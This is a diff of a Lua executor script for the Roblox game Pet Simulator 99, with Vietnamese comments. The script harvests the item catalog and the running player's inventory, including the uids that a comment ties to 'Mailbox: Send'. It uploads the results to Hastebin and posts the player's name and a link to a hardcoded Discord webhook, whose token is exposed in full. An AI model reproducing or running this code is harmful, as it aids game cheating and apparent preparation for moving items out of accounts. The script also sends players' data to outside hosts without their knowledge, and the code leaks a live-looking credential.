@@ -1,203 +1,182 @@
 -- PS99_GetIDs.lua
--- BƯỚC 1: Debug để tìm đường dẫn đúng trong ReplicatedStorage
--- BƯỚC 2: Lấy toàn bộ item ID và gửi Discord
+-- Lấy toàn bộ item ID (string) từ catalog PS99
+-- Upload lên Hastebin → gửi link vào Discord (1 message duy nhất)
 
 local HttpService = game:GetService("HttpService")
 local RS = game:GetService("ReplicatedStorage")
+local plr = game.Players.LocalPlayer
 
-local webhook = "https://discord.com/api/webhooks/1502362195713851492/dsHs2vfdFsqse7tgsoL46ys4614t9UsctOntWMDuY-qXO4nFaGwiiqmf1zTba1cVRsJU"
+local WEBHOOK = "https://discord.com/api/webhooks/1502362195713851492/dsHs2vfdFsqse7tgsoL46ys4614t9UsctOntWMDuY-qXO4nFaGwiiqmf1zTba1cVRsJU"
 
--- ============================================================
--- HELPER: Gửi status đơn giản (màu tùy chỉnh, không cần text dài)
--- color: 0x00ff00 = xanh, 0xffaa00 = cam, 0xff0000 = đỏ
--- ============================================================
-local function sendStatus(title, desc, color)
+-- Helper gửi Discord đơn giản
+local function ping(title, desc, color)
     pcall(function()
         request({
-            Url     = webhook,
-            Method  = "POST",
+            Url = WEBHOOK, Method = "POST",
             Headers = {["Content-Type"] = "application/json"},
-            Body    = HttpService:JSONEncode({
-                embeds = {{
-                    title       = title,
-                    description = desc,
-                    color       = color or 0x00ff00,
-                }}
+            Body = HttpService:JSONEncode({
+                embeds = {{title=title, description=desc, color=color or 0xffaa00}}
             }),
         })
     end)
 end
 
 -- ============================================================
--- HELPER: Gửi text dài tới Discord (tự chia chunk)
--- ============================================================
-local function sendDiscord(title, text)
-    local MAX = 1800
-    local parts = {}
-    while #text > 0 do
-        table.insert(parts, text:sub(1, MAX))
-        text = text:sub(MAX + 1)
-    end
-    for i, part in ipairs(parts) do
-        local payload = {
-            embeds = {{
-                title       = title .. (i > 1 and (" (cont. "..i..")") or ""),
-                description = "```\n" .. part .. "\n```",
-                color       = 0x00ff00,
-            }}
-        }
-        pcall(function()
-            request({
-                Url     = webhook,
-                Method  = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body    = HttpService:JSONEncode(payload),
-            })
-        end)
-        wait(1.2) -- tránh rate-limit
-    end
-end
-
--- ============================================================
 -- THÔNG BÁO BẮT ĐẦU
 -- ============================================================
-local plr = game.Players.LocalPlayer
-sendStatus(
-    "🟡 BẮT ĐẦU QUÉT CATALOG",
-    string.format("**Người dùng:** %s\n**Game:** %s\n**Thời gian:** %s",
-        plr.Name,
-        game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
-        os.date("%H:%M:%S %d/%m/%Y")
-    ),
-    0xffaa00  -- màu cam = đang chạy
-)
-print("[PS99] === BẮT ĐẦU QUÉT CATALOG ===")
+ping("🟡 BẮT ĐẦU", "**User:** "..plr.Name.."\n**Đang quét catalog PS99...**", 0xffaa00)
+print("[PS99] BẮT ĐẦU")
 
 -- ============================================================
--- BƯỚC 1: Tìm đường dẫn chính xác trong RS
--- In ra tất cả children của RS để biết cấu trúc
+-- THU THẬP ID TỪ CATALOG (id là STRING - tên loại item)
+-- uid là NUMBER trong inventory, dùng khi gửi mail
 -- ============================================================
-local debugLines = {}
-local function explore(obj, depth, maxDepth)
-    if depth > maxDepth then return end
-    for _, child in ipairs(obj:GetChildren()) do
-        table.insert(debugLines, string.rep("  ", depth) .. child.ClassName .. " : " .. child.Name)
-        if child:IsA("Folder") or child:IsA("ModuleScript") then
-            explore(child, depth + 1, maxDepth)
-        end
-    end
-end
-
-print("[PS99] Scanning ReplicatedStorage structure...")
-explore(RS, 0, 3)  -- scan 3 cấp sâu
-local structureText = table.concat(debugLines, "\n")
-print(structureText)
-sendDiscord("RS Structure (depth 3)", structureText)
-
 -- ============================================================
--- BƯỚC 2: Thử lấy item IDs từ các đường dẫn phổ biến
--- Dựa theo ZapHub gốc: RS.Library.Directory.Pets[item.id]
+-- PHẦN 1: CATALOG – lấy id (STRING) = tên loại vật phẩm
+-- Dùng để: hiển thị trên web, tìm RAP
 -- ============================================================
-print("[PS99] Trying to extract item IDs...")
+local catalogLines = {}
+local total = 0
 
-local allItems = {}
+local categories = {"Pets","Eggs","Charms","Enchant","Enchants",
+    "Potion","Potions","Misc","Hoverboard","Hoverboards",
+    "Booth","Booths","Ultimate","Ultimates","Charm"}
 
--- Thử từng path phổ biến trong PS99
-local tryPaths = {
-    -- path gốc từ ZapHub.md
-    {label = "Pets",        path = function() return require(RS.Library.Directory.Pets) end},
-    {label = "Eggs",        path = function() return require(RS.Library.Directory.Eggs) end},
-    {label = "Charms",      path = function() return require(RS.Library.Directory.Charms) end},
-    {label = "Enchant",     path = function() return require(RS.Library.Directory.Enchant) end},
-    {label = "Potions",     path = function() return require(RS.Library.Directory.Potions) end},
-    {label = "Misc",        path = function() return require(RS.Library.Directory.Misc) end},
-    {label = "Hoverboards", path = function() return require(RS.Library.Directory.Hoverboards) end},
-    {label = "Booths",      path = function() return require(RS.Library.Directory.Booths) end},
-    {label = "Ultimates",   path = function() return require(RS.Library.Directory.Ultimates) end},
-    -- Đôi khi tên là số ít
-    {label = "Potion",      path = function() return require(RS.Library.Directory.Potion) end},
-    {label = "Hoverboard",  path = function() return require(RS.Library.Directory.Hoverboard) end},
-    {label = "Booth",       path = function() return require(RS.Library.Directory.Booth) end},
-    {label = "Ultimate",    path = function() return require(RS.Library.Directory.Ultimate) end},
-    {label = "Charm",       path = function() return require(RS.Library.Directory.Charm) end},
-}
-
-for _, entry in ipairs(tryPaths) do
-    local ok, data = pcall(entry.path)
-    if ok and typeof(data) == "table" then
-        local count = 0
-        for id, _ in pairs(data) do
-            if typeof(id) == "string" then
-                table.insert(allItems, entry.label .. " | " .. id)
-                count = count + 1
-            end
-        end
-        print("[PS99] " .. entry.label .. ": " .. count .. " items found")
-    else
-        print("[PS99] " .. entry.label .. ": NOT FOUND or error:", tostring(data))
-    end
-end
-
--- ============================================================
--- BƯỚC 3: Nếu không tìm được qua Directory, dùng getgc()
--- để lấy module đã được require rồi
--- ============================================================
-if #allItems == 0 then
-    print("[PS99] Thử phương pháp getgc()...")
-    local gcLines = {}
-    for _, func in pairs(getgc(true)) do
-        if typeof(func) == "table" then
-            -- Tìm các bảng có nhiều key string (có thể là catalog)
+for _, catName in ipairs(categories) do
+    local moduleRef = RS.Library.Directory:FindFirstChild(catName)
+    if moduleRef then
+        local ok, data = pcall(require, moduleRef)
+        if ok and typeof(data) == "table" then
             local count = 0
-            local sample = ""
-            for k, v in pairs(func) do
-                if typeof(k) == "string" and typeof(v) == "table" then
+            for itemId, _ in pairs(data) do
+                if typeof(itemId) == "string" then
+                    table.insert(catalogLines, catName.."|"..itemId)
                     count = count + 1
-                    if sample == "" then sample = k end
+                    total = total + 1
                 end
             end
-            if count > 50 then  -- catalog thường có > 50 entry
-                table.insert(gcLines, "Table với " .. count .. " entries, sample key: " .. sample)
-                for k, _ in pairs(func) do
-                    if typeof(k) == "string" then
-                        table.insert(allItems, "GC | " .. k)
-                    end
+            print("[PS99] CATALOG", catName, count, "items")
+        else
+            print("[PS99] CATALOG SKIP:", catName, tostring(data))
+        end
+    end
+end
+
+-- ============================================================
+-- PHẦN 2: INVENTORY – lấy uid (NUMBER) = ID gửi Mailbox
+-- Dùng để: gọi network.Invoke("Mailbox: Send", ..., uid, ...)
+-- ============================================================
+local inventoryLines = {}
+local GetSave = function()
+    return require(RS.Library.Client.Save).Get()
+end
+
+local ok2, save = pcall(function() return GetSave().Inventory end)
+if ok2 and save then
+    local invCats = {"Pet","Egg","Charm","Enchant","Potion","Misc","Hoverboard","Booth","Ultimate"}
+    for _, catName in ipairs(invCats) do
+        local bag = save[catName]
+        if bag and typeof(bag) == "table" then
+            local count = 0
+            for uid, item in pairs(bag) do
+                -- uid = NUMBER (dùng khi gửi mail)
+                -- item.id = STRING (tên loại vật phẩm)
+                if typeof(uid) == "number" and typeof(item) == "table" and item.id then
+                    local prefix = ""
+                    if item.pt == 1 then prefix = "Golden_" elseif item.pt == 2 then prefix = "Rainbow_" end
+                    if item.sh then prefix = "Shiny_" .. prefix end
+                    table.insert(inventoryLines,
+                        string.format("%s|uid:%d|id:%s%s|qty:%d",
+                            catName, uid, prefix, item.id, item._am or 1))
+                    count = count + 1
                 end
-                break  -- lấy bảng đầu tiên đủ lớn
+            end
+            print("[PS99] INVENTORY", catName, count, "items")
+        end
+    end
+else
+    print("[PS99] INVENTORY: Không lấy được save data:", tostring(save))
+end
+
+-- Gộp cả 2 phần thành 1 output
+local lines = {}
+table.insert(lines, "=== CATALOG (id - string) ===")
+for _, l in ipairs(catalogLines) do table.insert(lines, l) end
+table.insert(lines, "")
+table.insert(lines, "=== INVENTORY (uid - number) ===")
+for _, l in ipairs(inventoryLines) do table.insert(lines, l) end
+
+-- ============================================================
+-- NẾU KHÔNG TÌM ĐƯỢC -> fallback: quét toàn bộ Directory
+-- ============================================================
+if total == 0 then
+    print("[PS99] Thử quét toàn bộ RS.Library.Directory...")
+    local dirFolder = RS.Library:FindFirstChild("Directory")
+    if dirFolder then
+        for _, mod in ipairs(dirFolder:GetChildren()) do
+            if mod:IsA("ModuleScript") then
+                local ok, data = pcall(require, mod)
+                if ok and typeof(data) == "table" then
+                    for itemId, _ in pairs(data) do
+                        if typeof(itemId) == "string" then
+                            table.insert(lines, mod.Name.."|"..itemId)
+                            total = total + 1
+                        end
+                    end
+                    print("[PS99]", mod.Name, "OK")
+                end
             end
         end
     end
-    print(table.concat(gcLines, "\n"))
-    sendDiscord("getgc() result", table.concat(gcLines, "\n"))
 end
 
 -- ============================================================
--- BƯỚC 4: Gửi toàn bộ ID lên Discord
+-- UPLOAD LÊN HASTEBIN → GỬI LINK VÀO DISCORD
 -- ============================================================
-if #allItems > 0 then
-    table.sort(allItems)
-    local resultText = table.concat(allItems, "\n")
-    print("[PS99] Tổng cộng:", #allItems, "items")
-    print(resultText)
-    sendDiscord(string.format("PS99 Item IDs (%d total)", #allItems), resultText)
+table.sort(lines)
+local content = table.concat(lines, "\n")
+
+if total > 0 then
+    -- Upload lên Hastebin
+    local hasteUrl = ""
+    local ok, resp = pcall(function()
+        return request({
+            Url    = "https://hastebin.com/documents",
+            Method = "POST",
+            Body   = content,
+            Headers = {["Content-Type"] = "text/plain"},
+        })
+    end)
+
+    if ok and resp and resp.Body then
+        local parsed = HttpService:JSONDecode(resp.Body)
+        if parsed and parsed.key then
+            hasteUrl = "https://hastebin.com/"..parsed.key
+        end
+    end
+
+    local desc = string.format(
+        "**User:** %s\n**Tổng item:** %d\n**Link file:** %s",
+        plr.Name, total,
+        hasteUrl ~= "" and hasteUrl or "*(Upload thất bại – xem console)*"
+    )
+    ping("✅ HOÀN THÀNH", desc, 0x00ff00)
+    print("[PS99] HOÀN THÀNH -", total, "items")
+    if hasteUrl ~= "" then
+        print("[PS99] Link:", hasteUrl)
+    end
 else
-    local msg = "Không tìm được item ID nào! Xem RS Structure ở embed trước."
-    print("[PS99] " .. msg)
-    sendDiscord("PS99 Item IDs - FAILED", msg)
-end
+    -- Gửi cấu trúc RS để debug
+    local rsDebug = {}
+    for _, child in ipairs(RS:GetDescendants()) do
+        if child:IsA("ModuleScript") and child:FindFirstAncestor("Directory") then
+            table.insert(rsDebug, child:GetFullName())
+        end
+    end
+    local debugText = #rsDebug > 0
+        and table.concat(rsDebug, "\n")
+        or "Không tìm thấy bất kỳ ModuleScript nào trong Directory!"
 
--- ============================================================
--- THÔNG BÁO HOÀN THÀNH
--- ============================================================
-local status = #allItems > 0
-sendStatus(
-    status and "✅ QUÉT CATALOG HOÀN THÀNH" or "❌ QUÉT CATALOG THẤT BẠI",
-    string.format(
-        "**Người dùng:** %s\n**Tổng item:** %d\n**Thời gian:** %s",
-        game.Players.LocalPlayer.Name,
-        #allItems,
-        os.date("%H:%M:%S %d/%m/%Y")
-    ),
-    status and 0x00ff00 or 0xff0000  -- xanh = xong, đỏ = thất bại
-)
-print("[PS99] === HOÀN THÀNH ===")
+    ping("❌ THẤT BẠI – RS Debug", "```\n"..debugText:sub(1,1800).."\n```", 0xff0000)
+    print("[PS99] THẤT BẠI\n"..debugText)
+end
